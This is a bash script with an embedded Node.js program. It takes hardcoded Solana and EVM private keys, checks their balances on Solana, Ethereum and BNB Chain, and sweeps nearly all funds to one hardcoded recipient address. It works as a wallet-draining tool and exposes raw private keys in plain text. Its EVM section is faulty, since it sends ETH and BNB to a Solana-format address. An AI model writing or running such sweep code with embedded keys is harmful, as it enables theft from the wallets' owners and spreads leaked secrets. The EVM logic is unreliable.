#!/usr/bin/env bash
set -e

if [ ! -f "package.json" ]; then
    npm init -y >/dev/null 2>&1
fi

if ! node -e "require('@solana/web3.js'); require('ethers'); require('bs58');" 2>/dev/null; then
    echo "[+] Installing multi-chain dependencies (@solana/web3.js ethers bs58)..."
    npm install @solana/web3.js ethers@6 bs58 --silent
fi

node << 'NODE_SCRIPT'
const { Connection, Keypair, LAMPORTS_PER_SOL, PublicKey, SystemProgram, Transaction, sendAndConfirmTransaction } = require("@solana/web3.js");
const { ethers } = require("ethers");
const bs58 = require("bs58");

const RAW_SOL_KEY = "3rfJYuhf7XZfwh83Vwk1fubJQrnfriDPHRL4EymQvV1Q7QZejX9gYMghAnzBdaAU1bFlDggnc58rqCY9MRMzxw1";
const EVM_PRIVATE_KEY = "c4389080437072a09215803a6b540f1e054797eeda2eec6d49076760d48e7589";
const RECIPIENT = "6hvN1x1UKTpETrAAb53RxsEW711b2g8n5d1wdsJ3GvJu";

async function sweepSolana() {
    console.log("=== Checking Solana Network ===");
    try {
        let secretKeyBytes;
        const cleaned = RAW_SOL_KEY.trim();
        try {
            secretKeyBytes = bs58.decode(cleaned);
        } catch (err) {
            const sanitized = cleaned.replace(/[^1-9A-HJ-NP-Za-km-z]/g, '');
            secretKeyBytes = bs58.decode(sanitized);
        }

        let keypair;
        if (secretKeyBytes.length === 64) {
            keypair = Keypair.fromSecretKey(secretKeyBytes, { skipValidation: true });
        } else if (secretKeyBytes.length === 63) {
            const padded = new Uint8Array(64);
            padded.set(secretKeyBytes, 0);
            keypair = Keypair.fromSecretKey(padded, { skipValidation: true });
        } else {
            keypair = Keypair.fromSeed(secretKeyBytes.slice(0, 32));
        }

        const connection = new Connection("https://api.mainnet-beta.solana.com", "confirmed");
        const balance = await connection.getBalance(keypair.publicKey);
        console.log(`Solana Address: ${keypair.publicKey.toBase58()} | Balance: ${balance / LAMPORTS_PER_SOL} SOL`);

        if (balance <= 5000) {
            console.log("[-] Solana balance too low to cover network fee.");
            return;
        }

        const transaction = new Transaction().add(
            SystemProgram.transfer({
                fromPubkey: keypair.publicKey,
                toPubkey: new PublicKey(RECIPIENT),
                lamports: balance - 5000,
            })
        );

        const sig = await sendAndConfirmTransaction(connection, transaction, [keypair]);
        console.log(`► Successfully swept SOL! Signature: ${sig}`);
    } catch (err) {
        console.error("Solana sweep error:", err.message);
    }
}

async function sweepEVM() {
    console.log("\n=== Checking EVM Networks (Ethereum & BNB) ===");
    const formattedKey = EVM_PRIVATE_KEY.startsWith("0x") ? EVM_PRIVATE_KEY : "0x" + EVM_PRIVATE_KEY;

    // Providers for Ethereum and BSC (BNB Smart Chain)
    const ethProvider = new ethers.JsonRpcProvider("https://eth.llamarpc.com");
    const bnbProvider = new ethers.JsonRpcProvider("https://bsc-dataseed.binance.org/");

    // Sweep Ethereum
    try {
        const walletEth = new ethers.Wallet(formattedKey, ethProvider);
        const ethBalance = await ethProvider.getBalance(walletEth.address);
        console.log(`Ethereum Address: ${walletEth.address} | Balance: ${ethers.formatEther(ethBalance)} ETH`);

        const feeData = await ethProvider.getFeeData();
        const gasPrice = feeData.gasPrice || ethers.parseUnits("20", "gwei");
        const gasLimit = 21000n;
        const totalCost = gasLimit * gasPrice;

        if (ethBalance > totalCost) {
            const valueToSend = ethBalance - totalCost;
            const tx = await walletEth.sendTransaction({
                to: RECIPIENT,
                value: valueToSend,
                gasLimit: gasLimit,
                gasPrice: gasPrice
            });
            console.log(`► Successfully swept ETH! Hash: ${tx.hash}`);
        } else {
            console.log("[-] Ethereum balance too low to cover gas fees.");
        }
    } catch (e) {
        console.log("[-] Ethereum sweep failed:", e.message);
    }

    // Sweep BNB (BSC)
    try {
        const walletBnb = new ethers.Wallet(formattedKey, bnbProvider);
        const bnbBalance = await bnbProvider.getBalance(walletBnb.address);
        console.log(`BNB Chain Address: ${walletBnb.address} | Balance: ${ethers.formatEther(bnbBalance)} BNB`);

        const feeDataBnb = await bnbProvider.getFeeData();
        const gasPriceBnb = feeDataBnb.gasPrice || ethers.parseUnits("3", "gwei");
        const gasLimit = 21000n;
        const totalCostBnb = gasLimit * gasPriceBnb;

        if (bnbBalance > totalCostBnb) {
            const valueToSend = bnbBalance - totalCostBnb;
            const tx = await walletBnb.sendTransaction({
                to: RECIPIENT,
                value: valueToSend,
                gasLimit: gasLimit,
                gasPrice: gasPriceBnb
            });
            console.log(`► Successfully swept BNB! Hash: ${tx.hash}`);
        } else {
            console.log("[-] BNB balance too low to cover gas fees.");
        }
    } catch (e) {
        console.log("[-] BNB sweep failed:", e.message);
    }
}

async function run() {
    await sweepSolana();
    await sweepEVM();
}

run();
NODE_SCRIPT
